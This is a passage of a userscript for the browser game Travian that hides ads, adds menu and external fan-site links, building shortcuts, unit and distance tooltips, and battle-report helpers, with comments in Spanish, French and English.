		lonelyTownNEWDID = GM_getValue("capital" + server + userID);
		// Plus
		if (find("//img[contains(@src, 'travian1.gif')]", XPFirst))
			plus = true;
		else
			plus = false;
	}

	/** Funcion que devuelve la version del juego de Travian que esta tratando
	 *
	 * Returns:
	 *			La version del juego
	 */
	function getVersion()
	{
		var a = find("//script[@type='text/javascript']", XPFirst);
		if (a)
		{
			a.src.search(/(\d).js$/);
			return RegExp.$1;
		}
		else
			return null;
	}

	/** Il cache les annonces */
	function hideAd()
	{
		var ad = find("//iframe", XPFirst);
		if (ad)
		{
			ad.style.display = 'none';
			if (ad = find("//div[contains(@style,'url(img/un/l/')] | //td[contains(@style, 'img/un/l/')]/ancestor::table", XPFirst))
			{
				var div = find("/html/body/div", XPFirst);
				div.style.height = '30px';
				if(ad.nodeName == 'TABLE')
					{
						removeElement(ad);
						removeElement(find("/html/body/div[2]", XPFirst));
						return;
					}
				if(ad.style.backgroundImage.indexOf("skyscraper_bg.gif") > -1)
					removeElement(ad);
				div.style.backgroundImage = '';
				find("/html/body/div[3]", XPFirst).style.height = "0px";
			}
		}
	}

	/** Il crée de nouveaux liens dans la barre de menu de gauche. Il sont internes et externes liées au jeu séparées par une ligne */
	function quickLinks()
	{
		var menu = find("//td[@class='menu']", XPFirst);
		for (var j = 0; j < 2; j++)
			for (var i = 0; i < menu.childNodes.length; i++)
				if (menu.childNodes[i].nodeName == 'BR')
					removeElement(menu.childNodes[i]);

		lienfix = readCookie("lienfix" + server);
		if (lienfix == false || lienfix == null)
		{
			var links = [		//	["<font color=#FF0000>Version " + version + "</font>", "http://userscripts.org/scripts/show/26429", "_blank"],
			0, [T('LOGIN'), "login.php"], [T('ALIANZA'), "allianz.php"], [T('SIM'), "warsim.php"],  //	0,
			//	["<font color=#0000FF>"+T('DEMO')+"</font>", "build.php?gid=15"],
			//	["<font color=#0000FF>"+T('ALDEA_EXTRA1')+"</font>", "a2b.php"],
			//	[T('ALDEA_EXTRA1'), "a2b.php"],
			//	["<font color=#0000FF>Armurerie", "build.php?gid=12"],
			//	["<font color=#0000FF>Usine_armures", "build.php?gid=13"],
			//	["<font color=#0000FF>Hôtel_de_ville", "build.php?gid=24"],
			//	["<font color=#0000FF>Palais_PC", "build.php?gid=26&s=2"],
			//	["<font color=#0000FF>Manoir_Héros", "build.php?gid=37"],
			0, ["<i>Travmap</i>", "http://travmap.shishnet.org/?lang=" + ext, "_blank"], ["<i>Travianmap</i>", "http://travianmap.nl/?ln=" + ext, "_blank"], ["<i>" + T('BUSCO') + "_9c-15c</i>", "http://asite.110mb.com/cropfinder.php", "_blank"], ["<i>" + T('TOOLS') + "</i>", "http://www.traviantoolbox.com/distances_et_temps", "_blank"], ["<i>" + T('FRIGO') + " (1)</i>", "http://www.travian-search.com/index.php?lang=fr&path=fridge", "_blank"], ["<i>" + T('FRIGO') + " (2)</i>", "http://traviantool3.ww7.be/frame_T.php?lang=fr&titre=inactive", "_blank"], 0, ]; //  + idioma, : Permet de rajouter un 'fr' apres un lien ou texte
		}
		else
		{
			var links = [		//	["<font color=#FF0000>Version " + version + "</font>", "http://userscripts.org/scripts/show/26429", "_blank"],
			0, [T('LOGIN'), "login.php"], [T('ALIANZA'), "allianz.php"], [T('SIM'), "warsim.php"],  //	0,
			//	["<font color=#0000FF>"+T('DEMO')+"</font>", "build.php?gid=15"],
			//	["<font color=#0000FF>"+T('ALDEA_EXTRA1')+"</font>", "a2b.php"],
			0, ["<i>" + T('BUSCO') + "_9c-15c</i>", "http://asite.110mb.com/cropfinder.php", "_blank"], ["<i>" + T('TOOLS') + "</i>", "http://www.traviantoolbox.com/distances_et_temps", "_blank"], 0, ];
		}

		for (var i = 0; i < links.length; i++)
		{
			if (links[i])
			{
				var a = $elem("A", links[i][0], {
					'href': links[i][1]
				});
				if (links[i][2])
					a.setAttribute('target', links[i][2]);

				menu.appendChild(a);
			}
			else
				menu.appendChild($elem('HR'));
		}
	}

	/** Il crée de nouveaux liens dans la barre de menu de gauche. Il sont internes pour tableaus dorf3 */
	function menulink()
	{	bookmarksinfo4 = readCookie("bookmarksinfo4" + server);
		if (bookmarksinfo4)
		{	var menu = find("//div[contains(@id, 'ltop')]", XPFirst);
			var links = [0, [T('TT') + ' -', "dorf3.php"], [T('DEP') + ' -', "dorf3.php?s=2"], [T('PC') + ' -', "dorf3.php?s=1"], [T('TROP') + ' -', "dorf3.php?s=5"], [T('FT'), "dorf3.php?s=7"]];
			var div = $elem("div", "", {}, {
				"cssFloat": textDirection == 'ltr' ? "right" : "left"
			}, menu);
			var table = $elem("table", "", {}, {}, div);
			for (var i = 0; i < links.length; i++)
			{
				if(links[i])
				{
					var td = $elem("td", "", {}, {}, tr);
					var a = $elem("a", links[i][0], {
						"href": links[i][1]
					}, {}, td);
					if (links[i][2])
						a.setAttribute("target", links[i][2]);
				}
				else
					var tr = $elem("tr", "", {}, {}, table);
			}
		}
	}

	/** Créer un dialogue pour confirmation de l'annulation des liens des constructions */
	function confirmDelete()
	{

		var links = find("//img[contains(@src, 'del.gif')]", XPList);
		for (var i = 0; i < links.snapshotLength; i++)
		{
			links.snapshotItem(i).setAttribute('onClick', 'javascript:return confirm("' + T('SEGURO') + '");');
		}
	}

	/** Créer des liens vers de nouveaux bâtiments dans la barre supérieur */
	function buildingLinks()
	{
		icone = readCookie("icone" + server);
		if (icone == true || icone == null)
		{
			// Localiza la barra de enlaces superiores
			//	var barra = find("//div[@id='ltop5']", XPFirst);
			var barra = find("//div[starts-with(@id, 'ltop')]", XPListO).snapshotItem(1);
			//var barra = get('ltop5'); // causes problem on german severs where varies this id. :-(

			//	barra.style.left = '161px';
			barra.style.left = '126px';
			barra.style.width = '570px';
			//barra.style.height = '120px';
			barra.style.display = 'none';

			var a = find("//a[contains(@href, 'plus.php')]", XPFirst);
			a.style.marginLeft = '0px';
			a.style.position = 'absolute';
			if (textDirection == 'ltr')
				a.style.left = '500px';
			else
				a.style.right = '500px';
			a.style.width = '0px';

			imgx = readCookie("imgx");
			if (imgx == false || imgx == null)
			{
				barra.innerHTML += '<img usemap="#mercado" class="fl2" src="' + img('/l/oto1.gif') + '" border="0" title="' + T('MERCADO') + '">';
				barra.innerHTML += '<img usemap="#militar" class="fl2" src="' + img('/l/oto2.gif') + '" border="0" title="' + T('CUARTEL') + '">';
				barra.innerHTML += '<img usemap="#admin" class="fl2" src="' + img('/l/oto3.gif') + '">';
			}
			else
			{
				barra.innerHTML += '<img usemap="#mercado" class="fl2" src="' + imagenes["mercado"] + '" border="0" title="' + T('MERCADO') + '">';
				barra.innerHTML += '<img usemap="#militar" class="fl2" src="' + imagenes["militar"] + '" border="0" title="' + T('CUARTEL') + '">';
				barra.innerHTML += '<img usemap="#admin" class="fl2" src="' + imagenes["admin"] + '">';
			}
			// Mapa para el mercado
			barra.innerHTML += '<map name="mercado"><area shape="rect" coords="0,0,70,50" href="build.php?gid=17" title="' + T('ENVIAR') + '"><area shape="rect" coords="0,50,35,100" href="build.php?gid=17&t=1" title="' + T('COMPRAR') + '"><area shape="rect" coords="35,50,70,100" href="build.php?gid=17&t=2" title="' + T('VENDER') + '"></map>';
			// Mapa para los edificios militares
			barra.innerHTML += '<map name="militar"><area shape="rect" coords="0,0,35,50" href="build.php?gid=16" title="' + T('PUNTO') + '"><area shape="rect" coords="35,0,70,50" href="build.php?gid=19" title="' + T('CUARTEL') + '"><area shape="rect" coords="0,50,35,100" href="build.php?gid=20" title="' + T('CORRAL') + '"><area shape="rect" coords="35,50,70,100" href="build.php?gid=21" title="' + T('TALLER') + '"></map>';
			// bat administratif
			barra.innerHTML += '<map name="admin"><area shape="rect" coords="0,0,35,50" href="build.php?gid=15" title="' + T('DEMO') + '"><area shape="rect" coords="35,0,70,50" href="build.php?gid=24" title="' + T('HOT') + '"><area shape="rect" coords="0,50,35,100" href="build.php?gid=12" title="' + T('ARM') + '"><area shape="rect" coords="35,50,70,100" href="build.php?gid=13" title="' + T('USI') + '"></map>';

			barra.style.display = '';
		}
	}

	/** Crée un lien pour télécharger les statistiques du monde Travian,  réception de la recherche comme un paramètre
	 *
	 * Params:
	 *	param	Parametro de busqueda para la estadistica
	 */
	function createStatLink(param)
	{
		var statlink = $elem('a', "<img src='" + imagenes["stat"] + "' style='margin:0px 1px 0px 1px; display: inline' title='" + T('STAT') + "' alt='Stat' border=0>", {"href": "javascript:void(0)"});
		var ref = 'http://www.denibol.com/proyectos/travian_world/stat2.php?server=' + server + '&' + param;
		statlink.addEventListener("mouseover", function()
		{
			timeout = setTimeout(function()
			{
				var a = get("tb_tooltip");
				a.innerHTML = "<img src='" + ref + "' border='0'/>";
				a.style.display = 'block';
			}, 1000);
		}, 0);
		statlink.addEventListener("mouseout", function()
		{
			clearTimeout(timeout);
			get("tb_tooltip").style.display = 'none';
		}, 0);
		statlink.addEventListener("click", function()
		{
			var popup = window.open(ref, 'popup', 'width=350, height=250');
			popup.focus();
			return false;
		}, 0);
		return statlink;
	}

	function getUnitAttack(unitNum)
	{
		return unitData[unitNum][unitAttackIndex];
	}

	function getUnitInfDefense(unitNum)
	{
		return unitData[unitNum][unitInfDefenseIndex];
	}

	function getUnitCavDefense(unitNum)
	{
		return unitData[unitNum][unitCavDefenseIndex];
	}

	function getUnitSpeed(unitNum)
	{
		return unitData[unitNum][unitSpeedIndex];
	}

	function getUnitName(unitNum)
	{
		return unitData[unitNum][unitNameIndex];
	}

	function getUnitBuilding(unitNum)
	{
		return unitData[unitNum][unitBuildingIndex];
	}

	function setUnitStatsTooltip(unitNum)
	{
		return function()
		{
			var tooltip = get('tb_tooltip');
			tooltip.style.display = 'block';
			var table = $elem('table');
			var row = $elem('tr', '', {}, {}, table);
			var td = $elem('td', getUnitName(unitNum), {'colspan':'3'}, {}, row);
			row = $elem('tr', '', {}, {}, table);
			td = $elem('td', '<img title="attack" src="' + img("/a/att_all.gif") + '">' + getUnitAttack(unitNum), {}, {}, row);
			td = $elem('td', '<img title="defense against infantry" src="' + img("/a/def_i.gif") + '">' + getUnitInfDefense(unitNum), {}, {}, row);
			td = $elem('td', '<img title="defense against cavalry" src="' + img("/a/def_c.gif") + '">' + getUnitCavDefense(unitNum), {}, {}, row);
			row = $elem('tr', '', {}, {}, table);
			td = $elem('td', T('VITS') + ' ' + getUnitSpeed(unitNum), {'colspan':'3'}, {}, row);
			row = $elem('tr', '', {}, {}, table);
			td = $elem('td', T('CAPA') + ' ' + uc[unitNum][4], {'colspan':'3'}, {}, row);

			tooltip.innerHTML = "";
			tooltip.appendChild(table);
		};
	}

	// surround unit images with an href to their manual page
	function unitStats()
	{
		var images = $tags("img");
		for (var i = 0; i < images.length; i++)
		{
			// make sure it's an unit image, and get the number
			if (!images[i].src.match(/img\/un\/u\/(\d+)\.gif/))
			{
				continue;
			}
			var unitNum = RegExp.$1;

			var finalObject = images[i];


			// don't overwrite any existing links
			if (images[i].parentNode.nodeName.toLowerCase() != "a")
			{
				// change the image to a link to the unit's manual page

				var link = $elem('a', '', {
					'href': 'javascript:void(0)',
					'onClick': 'Popup(' + unitNum + ',1); return false;'
				});
				var image = images[i].cloneNode(true);
				images[i].parentNode.replaceChild(link, images[i]);
				link.appendChild(image);
				image.setAttribute('border', 0);
				image.removeAttribute('title');
				finalObject = link;
			}

			// set up tool tip to show stats on mouseover
			finalObject.addEventListener("mouseover", setUnitStatsTooltip(unitNum), 0);
			finalObject.addEventListener("mouseout", function()
			{
				get("tb_tooltip").style.display = 'none';
			}, 0);
		}
	}

	/** Crea un enlace para mandar un IGM cuando aparece un enlace al perfil de un jugador, un enlace de ataque rapido cuando aparece un enlace a una ubicacion del mapa, y otro enlace de estadisticas si esta soportado para el idioma del servidor activo */
	function playerLinks()
	{
		var links = $tags("a");

		var title = document.title;
		var stsu = title.substring(8);

		location.href.search(/(\d|x|speed)[.]travian/i);
		svr = RegExp.$1;
		svr = (svr=='speed') ? 'x' : svr;

		var ally = readCookie("ally1" + server);
		if (ally == null)
			ally = '';
		else
			ally = unescape(ally);

		//get x|y of our current selected village for distance calculation
		if (find("//a[@class='active_vl']", XPFirst) == null)
		{
			var activeX = 0;
			var activeY = 0
		}
		else
		{
			find("//a[@class='active_vl']", XPFirst).parentNode.nextSibling.textContent.match(/\(([-\d]+)\n\|\n([-\d]+)\)/);
			var activeX = RegExp.$1;
			var activeY = RegExp.$2;
		}
		for (var i = 0; i < links.length; i++)
		{
			// Por cada enlace a una ficha de jugador
			if (links[i].href.search(/spieler.php\?uid=(\d+$)/) > 0)
			{
				var a = RegExp.$1;
				//if (RegExp.$1 == 0) continue;
				if (links[i].parentNode.className == 'menu')
					continue;
				if (arrayValueExist(server))
					links[i].parentNode.insertBefore(createStatLink('uid=' + a), links[i].nextSibling);
				// Introduce el enlace para enviar mensajes usando su ID
				var igmlink = $elem('a', "<img src='" + imagenes["igm"] + "' style='margin:3px 0px 1px 3px; display: inline' title='" + T('ENVIAR_IGM') + "' alt='' border=0>", {"href": 'nachrichten.php?t=1&id=' + a});
				links[i].parentNode.insertBefore(igmlink, links[i].nextSibling);

				inf3 = readCookie("inf3" + server);
				if (inf3 == true || inf3 == null)
				{
					// Introduce el enlace para info carte travmap.shishnet.org
					var igmlink = $elem('a', '<img src="img/un/a/b4.gif" width="9" border="0" title="' + T('ALDEA_EXTRA8') + '">',{
						"target": "_blank",
						"class": "done",
						"href": "http://travmap.shishnet.org/map.php?lang=" + ext + "&server=" + server + "&player=id:" + a + ",&alliance=" + ally + "&groupby=alliance&order=population&azoom=on&format=svg&"
					});
					links[i].parentNode.insertBefore(igmlink, links[i].nextSibling);
				}
				inf2 = readCookie("inf2" + server);
				if (inf2 == true || inf2 == null)
				{
					if(ext != "br") // Brazilian servers are not on Travian Search
					{
						// Introduce el enlace para info travian-search
						var igmlink = $elem('a', '<img src="img/un/a/b5.gif" width="9" border="0" title="' + T('ALDEA_EXTRA7') + '">',{
							"target": "_blank",
							"class": "done",
							"href": "http://www.travian-search.com/?lang=" + ext + "&path=guild&s=19&serv=s" + svr + "_travian_" + ext + "&idJoueur=" + a
						});
					}	links[i].parentNode.insertBefore(igmlink, links[i].nextSibling);
				}
				inf1b = readCookie("inf1b" + server);
				if (inf1b == true || inf1b == null)
				{
					// Introduce el enlace para info Travian World Analyzer (travian.ws)
					var igmlink = $elem('a', '<img src="img/un/a/b1.gif" width="9" border="0" title="' + T('ALDEA_EXTRA6B') + '">',{
						"target": "_blank",
						"class": "done",
						"href": "http://www.travian.ws/analyser.pl?s="  + stsu + "&uid=" + a
					});
					links[i].parentNode.insertBefore(igmlink, links[i].nextSibling);
				}
					inf1 = readCookie("inf1" + server);
				if (inf1 == true || inf1 == null)
				{
					// Introduce el enlace para info TSU
					var igmlink = $elem('a', '<img src="img/un/a/b1.gif" width="9" border="0" title="' + T('ALDEA_EXTRA6') + '">',{
						"target": "_blank",
						"class": "done",
						"href": "http://www.travutils.com/?s="  + stsu + "&idu=" + a
					});
					links[i].parentNode.insertBefore(igmlink, links[i].nextSibling);
				}

				// Por cada enlace a una localizacion del mapa
			}
			else
				if (links[i].href.search(/karte.php\?d=(\d+)/) > 0)
				{
					var linkval = RegExp.$1;
					if (arrayValueExist(server))
						links[i].parentNode.insertBefore(createStatLink('id=' + linkval), links[i].nextSibling);
					//TMR - do we want a link to the Analyzer by village?  We're getting crowded.
					// add it here if we decide we do.

					// Agrega un enlace para lanzar un ataque usando su posicion
					//# TMR - insert link to Center Map
					var xy = id2xy(linkval); //get x|y of this link
					var coordanchor = "#" + xy.x + "|" + xy.y;
					links[i].setAttribute('href', links[i].getAttribute('href') + coordanchor);

					atklink = $elem('a', '(' + xy.x + '|' + xy.y + ')', {
						'href': 'karte.php?z=' + linkval + coordanchor
					}, {
						'fontSize': '9px'
					});
					// set up tool tip to show distances on mouseover
					//var mover = 'getVillageDist("' + xy.x + '", "' + xy.y + '")';
					atklink.addEventListener("mouseover", getVillageDist(xy.x, xy.y), 0);
					atklink.addEventListener("mouseout", function()
					{
						clearTimeout(timeout);
						get("tb_tooltip").style.display = 'none';
					}, 0);
					links[i].parentNode.insertBefore(atklink, links[i].nextSibling);

					n = find("//table[@class='f10']//*/a[preceding-sibling::span]", XPList);
					var img = 'att_all';
					for (var j = 0; j < n.snapshotLength; j++)
					{
						//alert('"'+n.snapshotItem(j).textContent+'" "'+links[i].textContent.replace(/^\s|\s$|^Reinforcement for /,"")+'"');
						if (n.snapshotItem(j).textContent == links[i].textContent.replace(/^\s|\s$|^Reinforcement for /g, "") || links[i].textContent.match(/^Reinforcement for /))
						{
							img = 'def2';
							break;
						}
					}
					// Agrega un enlace para lanzar un ataque usando su posicion
					var atklink = $elem('a', "<img src='" + imagenes[img] + "' style='margin:3px 0px 1px 3px; display: inline' height='10' width='10' title='" + T('ATACAR'), {"href": 'a2b.php?z=' + linkval + "#" + xy.x + "|" + xy.y});
					links[i].parentNode.insertBefore(atklink, links[i].nextSibling);
					var atklink = $elem('a', '<img src="img/un/r/4.gif" width="18" border="0" title="' + T('ALDEA_EXTRA2') + '">', {"href": 'build.php?z=' + linkval + '&gid=17'});
					links[i].parentNode.insertBefore(atklink, links[i].nextSibling);
				// Por cada enlace a la ficha de una alianza
				}
				else
					if (links[i].textContent.match(/Center map$/) && links[i].href.search(/karte.php\?z=(\d+)/) > 0)
					{
						var linkval = RegExp.$1; //# TMR - insert coords/mouseover to Center Map link
						var xy = id2xy(linkval); //get x|y of this link
						links[i].innerHTML += '&nbsp;<span style="font-size:10px">(' + xy.x + '|' + xy.y + ')</span>';
						//var mover = 'getVillageDist("' + xy.x + '", "' + xy.y + '")';
						links[i].addEventListener("mouseover", getVillageDist(xy.x, xy.y), 0);
						links[i].addEventListener("mouseout", function()
						{
							clearTimeout(timeout);
							get("tb_tooltip").style.display = 'none';
						}, 0);
					}
					else
						if (links[i].href.search(/allianz.php\?aid=(\d+$)/) > 0)
						{
							var a = RegExp.$1;
							if (a == 0)
								continue;

							inf3 = readCookie("inf3" + server);
							if (inf3 == true || inf3 == null)
							{
								// Introduce el enlace para info carte travmap.shishnet.org
								var igmlink = $elem('a', '<img src="img/un/a/b4.gif" width="9" border="0" title="' + T('ALDEA_EXTRA8') + '">',{
									"target": "_blank",
									"class": "done",
									"href": "http://travmap.shishnet.org/map.php?lang=" + ext + "&server=" + server + "&alliance=id:" + a + "%2C" + ally + "&groupby=alliance&order=population&azoom=on&format=svg&"
								});
								links[i].parentNode.insertBefore(igmlink, links[i].nextSibling);
							}
							inf2 = readCookie("inf2" + server);
							if (inf2 == true || inf2 == null)
							{
								if(ext != 'br') // Brazilian servers are not on Travian Search
								{
									// Introduce el enlace para info travian-search
									var igmlink = $elem('a', '<img src="img/un/a/b5.gif" width="9" border="0" title="' + T('ALDEA_EXTRA7') + '">',{
										"target": "_blank",
										"class": "done",
										"href": "http://www.travian-search.com/?lang=" + ext + "&path=guild&s=15&serv=s" + svr + "_travian_" + ext + "&ally=" + a
									});
									links[i].parentNode.insertBefore(igmlink, links[i].nextSibling);
								}
							}
							inf1b = readCookie("inf1b" + server);
							if (inf1b == true || inf1b == null)
							{
								// Introduce el enlace para info Travian World Analyzer (travian.ws)
								var igmlink = $elem('a', '<img src="img/un/a/b1.gif" width="9" border="0" title="' + T('ALDEA_EXTRA6B') + '">',{
									"target": "_blank",
									"class": "done",
									"href": "http://www.travian.ws/analyser.pl?s="  + stsu + "&aid=" + a
								});
								links[i].parentNode.insertBefore(igmlink, links[i].nextSibling);
							}
							inf1 = readCookie("inf1" + server);
							if (inf1 == true || inf1 == null)
							{
								// Introduce el enlace para info TSU
								var igmlink = $elem('a', '<img src="img/un/a/b1.gif" width="9" border="0" title="' + T('ALDEA_EXTRA6') + '">',{
									"target": "_blank",
									"class": "done",
									"href": "http://www.travutils.com/?s=" + stsu + "&ida=" + a
								});
								links[i].parentNode.insertBefore(igmlink, links[i].nextSibling);
							}
						}
		}
	}

	//show distance from all villages in tooltip
	function getVillageDist(x, y)
	{
		return function(e)
		{
			var cities = find("//div[@id='lright1']//table[@class='f10']", XPFirst);
			if (cities)
				if (/newdid=/.test(cities.innerHTML))
				{
					var txt1 = new Array();
					txt1.push('<tr><td colspan="3" align=center><b>' + x + '|' + y + '</b></td></tr><tr><td style="border-bottom:1px solid #00C000;"><b>' + T('ALDEA') + '</b></td><td align=right style="border-bottom:solid 1px #00C000;"><b>' + T('DIST') + '</b></td><td align=right style="border-bottom:solid 1px #00C000;"><b>' + T('VITS') + ' ' + nbunit + '</b></td></tr>');
					cities = cities.firstChild;
					for (var j = 0; j < cities.childNodes.length; j++)
					{
						var city = cities.childNodes[j];
						var cityname = city.childNodes[0].childNodes[2].textContent;
						city.textContent.search(/\((.*)\n?\|\n?(.*)\)/);
						var x2 = parseInt(RegExp.$1, 10);
						var y2 = parseInt(RegExp.$2, 10);
						var xx = Math.abs(x - x2) + (-801 * (x > 400));
						var yy = Math.abs(y - y2) + (-801 * (y > 400));
						var dist = Math.sqrt(xx * xx + yy * yy).toFixed(2);
						if (nbunit >= 1)
						{
							if (dist < 30)
							{
								var unitcalc = Math.round(dist * 3600 / nbunit);
								var timeunit = formatear_tiempo(unitcalc);
							}
							else {var timeunit ='>30'}
						/*	{
								crearEventoActualizarAldeaPT()
								var unitcalc = Math.round(dist * 3600 / nbunit / pdt[lvlpdt]);
								var timeunit = formatear_tiempo(unitcalc);
							}*/
						}
						else{var timeunit =''}
						txt1.push('<tr><td>' + cityname + '</td><td align=right>' + dist + '</td><td align=right>' + timeunit + '</td></tr>');
					}

					timeout = setTimeout(function()
					{
						var div = get("tb_tooltip");
						div.innerHTML = "";
						div.appendChild($elem('table', txt1.join('')));
						div.style.display = 'block';
					}, 100);
				}
		}
	}

	/** Créer un nouveau bouton dans les rapports et les messages pour marquer toutes les cases */
	function opcionesMensajes()
	{
		var a = find("//*[@class='s7']", XPList);
		for (var i = 0; i < a.snapshotLength - 1; i++)
		{
			var fila = a.snapshotItem(i);
			if ((fila.firstChild != null) && (fila.firstChild.nodeName == "INPUT"))
			{
				fila.innerHTML += '<input style="font-weight:bold; font-size:8pt; height:14pt" name="mtodo" type="button" value="' + T('MARK') + '" onClick="for(var x = 0; x < document.msg.elements.length; x++) document.msg.elements[x].checked = \'checked\';"/>';
				if (!plus)
					fila.innerHTML += '<input style="font-weight:bold; font-size:8pt; height:14pt" name="archive" type="Submit" value="' + T('ARCHIVE') + '"/>';
				return;
			}
		}
	}

	/** Créer des événements pour envoyer le formulaire pour envoyer marché des matières premières coordonnées de leurs propres villages. * Codigo sugerido por Bafox */
	function quickCity()
	{
		//alert('here');
		// Comprueba si esta el formulario de envio
		var map = 0;
		if (find("//form[@name='snd']", XPFirst) == null)
		{
			if ($names('xp')[0])
			{ //TMR added this for the map page
				map = 1;
			}
			else
			{
				return;
			}
		}


		var ciudades = new Array();

		// Recupera la coordenada X
		//var n = find("//table[@class='f8']//*/td[@align='right']", XPList);
		var n = find("//table[@class='dtbl']//td[@class='right dlist1']", XPList);
		for (var i = 0; i < n.snapshotLength; i++)
		{
			ciudades[i] = new Object();
			try
			{
				ciudades[i].x = n.snapshotItem(i).innerHTML.split('(')[1];
			}
			catch (e)
			{
			}
		}

		// Recupera la coordenada Y
		//n = find("//table[@class='f8']//*/td[@align='left']", XPList);
		n = find("//table[@class='dtbl']//td[@class='left dlist3']", XPList);
		for (var i = 0; i < n.snapshotLength; i++)
		{
			try
			{
				ciudades[i].y = n.snapshotItem(i).innerHTML.split(')')[0];
			}
			catch (e)
			{
			}
		}
		// Por cada par de coordenadas crea un evento para copiarlas al formulario
		//n = find("//table[@class='f8' and @width='73']//tr", XPList);  // TMR - added @width='73' for map page
		n = find("//table[@class='dtbl']//tr", XPList);
		for (var i = 0; i < ciudades.length; i++)
		{
			var elem = n.snapshotItem(i);
			if (map == 1)
				elem.setAttribute('onClick', "document.getElementsByName('xp')[0].value='" + ciudades[i].x + "';document.getElementsByName('yp')[0].value='" + ciudades[i].y + "'");
			else
				elem.setAttribute('onClick', "snd.x.value='" + ciudades[i].x + "';snd.y.value='" + ciudades[i].y + "'");
			elem.setAttribute('onMouseOver', 'this.style.color="red"');
			elem.setAttribute('onMouseOut', 'this.style.color="black"');
			elem.style.cursor = "pointer";
		}
	}

	// determines if the current page is a scout report
	function isScoutAttackReport()
	{
		// only worry about this on reports
		if (window.top.location.href.indexOf('berichte.php', 0) == -1)
		{
			return false;
		}

		var attackerVillage;
		var defenderVillage;
		var attackMessage
		var tds = $tags("td")
		for (var i = 0; i < tds.length; i++)
		{
			if (tds[i].innerHTML == "Attacker")
			{
				attackerVillage = $tags("a", tds[i].parentNode)[1].innerHTML;
			}
			if (tds[i].innerHTML == "Defender")
			{
				var hrefs = $tags("a", tds[i].parentNode);
				if (hrefs.length >= 2)
				{
					defenderVillage = hrefs[1].innerHTML;
				}
			}
		}
		var attackMessage = find("//tr[@class='rbg']//td", XPList).snapshotItem(1).innerHTML;


		return (attackMessage.indexOf(attackerVillage + " scouts " + defenderVillage, 0) != -1);
	}

	// Triggers as long as you're not being attacked...
	/*	function isRaid()	{
	 //link to defending village:
	 var foo = find("//tbody//tr//td[@colspan='10']//a", XPList);
	 foo = foo.snapshotItem(2);
	 foo += "";
	 foo = foo.match(/\d+(?=&)/gi); //Village ID of defending village / z

	 // your villages:
	 var right = find("//tbody//tr//td[@class='right']", XPList);

	 var village;
	 var id;

	 for( i = 0; i < right.snapshotLength; i++)
	 {
	 //goes through your list of villages to see if you are defending.

	 village = right.snapshotItem(i);

	 //get coordinates: x = 0, y = 1;
	 village = village.innerHTML.replace(/\n/gi, "").split(/<[^<>]+>/).join("").replace(/[()]/g, "").split("|");

	 id = xy2id(village[0], village[1]);

	 if(id*1 == foo*1){return false;}
	 }

	 return true;
	 }*/
	// b is title, a is link
	function addBookmark(b, a)
	{
		b += "";
		a += "";

		agregarElementoCookie("marcadores", [b, a]);
		removeElement('marcadores');
		mostrarMarcadores();
	}

	/** Il calcule et affiche des informations supplémentaires dans les rapports d'attaques * Codigo inicial de Bafox */
	function reportBatalla()
	{
		var t = find("//table[@class='tbg']//table[@class='tbg']", XPList);
	    if (t.snapshotLength > 1)
	    {
			location.href.match(/id=(\d+)/);
			var delreporthref = 'berichte.php\?n1=' + RegExp.$1 + '&del=Delete';
			var delreport = $elem("TR");
			delreport.className = "cbg1";
		//	delreport.innerHTML = '<td class=rgb colspan=2>&nbsp;<input style="font-weight:bold; font-size:8pt; height:14pt" onClick="document.location.href=\'' + delreporthref + '\'" type=button value="' + T('ELIMINAR') + '">';
			find("//table//table[@class='tbg']", XPFirst).parentNode.appendChild(delreport);

			if (find("//table[@class='tbg']//tr[@class='rbg']", XPFirst).textContent.match(/ supplies | reinforces /))
				return;

			var bookmarkRaid = '&nbsp;<input style="font-weight:bold; font-size:8pt; height:14pt" onClick="javascript:void(0);" value="' + T('MP') + '" type=button id=orange />';
			var raidhref = find("//tbody//tr[@class='cbg1']//a", XPList);
			//	var where = raidhref.snapshotItem(raidhref.snapshotLength - (raidhref.snapshotLength / 2)).innerHTML + " " + raidhref.snapshotItem(raidhref.snapshotLength - 1).innerHTML + " " + raidhref.snapshotItem(raidhref.snapshotLength - 4).innerHTML;
			//	where = where.replace("\n", "");
			raidhref = raidhref.snapshotItem(raidhref.snapshotLength - 4).href;

			var foo = find("//tbody//tr[@class='cbg1']", XPList)
			foo.snapshotItem(foo.snapshotLength - 1).innerHTML += (bookmarkRaid);

			get("orange").addEventListener("click", function()
			{ //addBookmark(where, raidhref);//}, false);
				var a = raidhref;
				var b = prompt(T('TEXTO'));
				if (b == null || b == '' || b == 'undefined')
					return;
				agregarElementoCookie("marcadores", [b, a]);
				removeElement('marcadores');
				mostrarMarcadores();
			}, 0);
			// Encuentra y suma todas las cantidades del botin
			var botin = null;
			var a = find("//tr[@class='cbg1']", XPList);
			if (a.snapshotLength >= 3)
			{
				// FIXME: Apa�o para Firefox. FF mete nodos de tipo texto vacios
				if (a.snapshotItem(1).childNodes.length == 4)
				{
					var b = a.snapshotItem(1).childNodes[3];
				}
				else
				{
					var b = a.snapshotItem(1).childNodes[1];
				}
				if (b.childNodes.length == 8)
				{
					var cantidades_botin = new Array();
					cantidades_botin[0] = parseInt(b.childNodes[1].nodeValue);
					cantidades_botin[1] = parseInt(b.childNodes[3].nodeValue);
					cantidades_botin[2] = parseInt(b.childNodes[5].nodeValue);
					cantidades_botin[3] = parseInt(b.childNodes[7].nodeValue);
					botin = arrayToInt(cantidades_botin);
					/*var info_botin = '';
					for (var i = 0; i < 4; i++)
					{
						info_botin += '<img src="' + img('r/' + (i + 1) + '.gif') + '" border="0" title="' + T('RECURSO' + (i + 1)) + '">';
						info_botin += cantidades_botin[i];
						if (i < 3)
							info_botin += ' + ';
						else
							info_botin += ' = ';
					}
					BattleAnalyse = readCookie("BattleAnalyse" + server);
					if (BattleAnalyse == false || BattleAnalyse == null)
					{
						info_botin += botin;
						b.innerHTML = info_botin;
					}*/
				}
			}

			var perds = new Array();
			var carry = new Array();
			// Por cada participante en la batalla (atacante, defensor y posibles apoyos)
			for (var g = 0; g < t.snapshotLength; g++)
			{
				perds[g] = [0, 0, 0, 0];
				carry[g] = 0;
				var tt = t.snapshotItem(g);
				var num_elementos = tt.rows[1].cells.length - 1;
				// ignore row 3 if it's prisoners and we freed them
				var countPrisonersAsLosses = false;

				var gotPrisoners = 0;
				for (var i = 0; i < tt.rows.length; i++)
				{ //freed line is variable depending on if there were casualites/catapult attacks
					if (tt.rows[i].cells[0].innerHTML == "Prisoners")
						gotPrisoners = i;
					if (gotPrisoners && tt.rows[i].cells[1].innerHTML.indexOf("freed") != -1)
						countPrisonersAsLosses = true;
				}
				for (var j = 1; j < 11; j++)
				{
